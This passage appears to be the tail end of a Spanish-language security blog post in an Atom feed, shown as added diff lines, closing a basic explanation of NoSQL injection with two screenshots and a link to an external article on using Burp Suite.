+&lt;p&gt;&lt;img src=&quot;../img/nosqli/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../img/nosqli/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y esta es una explicación básica, sencilla y somera de las nociones de inyecciones NoSQL.&lt;/p&gt;
+
+&lt;p&gt;También existe la opción, un poco menos cómoda pero más sencilla, de realizar este proceso con &lt;a href=&quot;https://rioasmara.com/2020/08/13/nosql-injection-and-bruteforce/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/p&gt;</content><author><name>Raúl Riesco</name></author><summary type="html">Explicación teórica</summary></entry></feed>
